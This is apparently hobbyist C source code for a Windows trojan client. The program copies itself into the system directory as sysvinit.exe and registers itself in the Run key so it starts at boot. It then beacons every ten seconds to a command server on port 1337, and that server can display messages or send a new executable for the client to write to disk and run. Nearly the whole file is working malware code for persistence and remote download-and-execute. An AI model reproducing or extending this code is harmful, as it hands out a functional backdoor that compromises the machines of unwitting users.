/**
 * QuickNDirty client 0.1 strain A
 * Fuck Youston, June 09
 */
#include "stdafx.h"
#include "qnd.h"
#include "sockutil.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <winsock.h>

#define VSTRAIN "qnd0.1a.1\n"
#define MSERVER "hammerhead.mateos.lan"
//#define DEBUG //Message boxs, dont want this on a deployment...

/* God damn it microsoft.... can haz c99?*/
#define uint8_t unsigned __int8
#define uint32_t unsigned __int32

const char *exenames[] = {	"\\sysvinit.exe" };

enum cmd {
	ERR,
	IAM, //Auth command
	BYE, //Disconnect request.
	NOP, //Command unaccepted/Unsuccessfull.
	PNG, //Just checking up...

	TDT, //Raw text data payload.
	BDT, //Raw bin data payload.

	EXC, //Execute app?
	MBX, //Display a message prompt?
	SCN, //Screenshot ?
	UPD, //Replace current virus with new payload.
};

struct cmd_packet {
	uint8_t cmd; //Protocol command, probably look above this.
	uint32_t pload_size; //Size of the command payload you plan to tack on the end.
};

int write_update(char *path, void *update, int size) {
	FILE *filehnd;

	if((filehnd = fopen(path, "wb")) == NULL)
		return 1;

	int val = fwrite(update, 1, size, filehnd);
	fclose(filehnd);
	return 0;
}

void infect_host(void) {
	int i;
	HKEY hkey;
	char pathtofile[MAX_PATH], system[MAX_PATH], syspathcomb[MAX_PATH];
	HMODULE modhandle = GetModuleHandle(NULL);

	/* Copy our virus to multiple exes in syspath, defined in exenames. */
	GetSystemDirectory(system, sizeof(system));
	GetModuleFileName(modhandle, pathtofile, sizeof(pathtofile));

	for(i = 0; i < (sizeof(exenames) / sizeof(exenames[0])); i++) {
		/* Clear the syspath buffer and append syspath with next exe name. */
		memset(syspathcomb, '\0', sizeof(syspathcomb));
		strcat(syspathcomb, system);
		strcat(syspathcomb, exenames[i]);
		CopyFile(pathtofile, syspathcomb, false);
	}

	/* Registry entry to boot it at startup. TODO: pick a random exe from above.*/
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
	RegSetValueEx(hkey, "sysvinit", 0, REG_SZ, (const unsigned char*)syspathcomb, sizeof(system));
	RegCloseKey(hkey);
}

int talk_to_master(void) {
	int serverloop, rcode;
	SOCKET sock;
	struct sockaddr_in condetails;
	struct hostent *hostaddr;
	struct cmd_packet initp, resp;
	void *readbuffer;

	/* Get some host details. */
	if(!(hostaddr = gethostbyname(MSERVER))) {
		return INVALID_SOCKET;
	}

	/* Setup the socket stuctures and tell the OS. */
	memset(&condetails, 0, sizeof(condetails));
	memcpy((char*)&condetails.sin_addr, hostaddr->h_addr, hostaddr->h_length);
	condetails.sin_family = hostaddr->h_addrtype;
	condetails.sin_port = htons(1337);

	if((sock = socket(hostaddr->h_addrtype, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		return INVALID_SOCKET;
	}

	/* Connect to the master. */
	if(connect(sock, (struct sockaddr*)&condetails, sizeof(condetails)) == SOCKET_ERROR) {	
		closesocket(sock);
		return INVALID_SOCKET;
	}

	/* Test packet and payload. */
	initp.cmd = IAM;
	initp.pload_size = strlen(VSTRAIN);
	sendall(sock, (char*)&initp, sizeof(initp), 0);
	sendall(sock, VSTRAIN, initp.pload_size, 0);

	serverloop = 1;
	while(serverloop) {
		/* Get the packet and die if we get a zero read or error. */
		rcode = recvall(sock, (char*)&resp, sizeof(resp), 0);
		if(rcode == 0 || rcode == -1) {
			serverloop = 0;
			break;
		}

		switch(resp.cmd) {
			case MBX:
				readbuffer = malloc(resp.pload_size+1); /* +1 for null char as.. */
				memset(readbuffer, '\0', resp.pload_size+1); /* ..we expect a string. */
				recvall(sock, (char*)readbuffer, resp.pload_size, 0);
				MessageBox(NULL, (char*)readbuffer, NULL, MB_OK);
				free(readbuffer);
				break;
			case UPD:
				readbuffer = malloc(resp.pload_size);
				memset(readbuffer, '\0', resp.pload_size);
				if(recvall(sock, (char*)readbuffer, resp.pload_size, 0) != resp.pload_size) { /* THIS IS READING SHORT :( */
					MessageBox(NULL, "short read", NULL, NULL);
					break;
				}
				write_update("sysvupdate.exe", readbuffer, resp.pload_size);
				system("sysvupdate.exe");
				free(readbuffer);
				closesocket(sock); /* Special case since were going to exit now. */
				break; /* wont happen. */
			case BYE:
			case ERR:
			default:
				serverloop = 0;
				break;
		}
	}
	closesocket(sock);
	return 0;
}

/* Time keeping macros, from ms -> value. */
#define WAIT_SEC(x) (1000*x)
#define WAIT_MIN(x) ((1000*60)*x)
#define WAIT_HR(x)  (((1000*60)*60)*x)

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCMDLine, int nShowCmd) {
	WSADATA info;
	if (WSAStartup(MAKEWORD(1,1), &info) != 0)
		return -1;

	infect_host(); // Note, maybe do this every check cycle incase user is
				   // smart enough to remove but too dumb to kill us.

	for(;;) {
		talk_to_master();
		Sleep(WAIT_SEC(10));
	}

	/* Were not savages after all. */
	WSACleanup();
	return 0;
}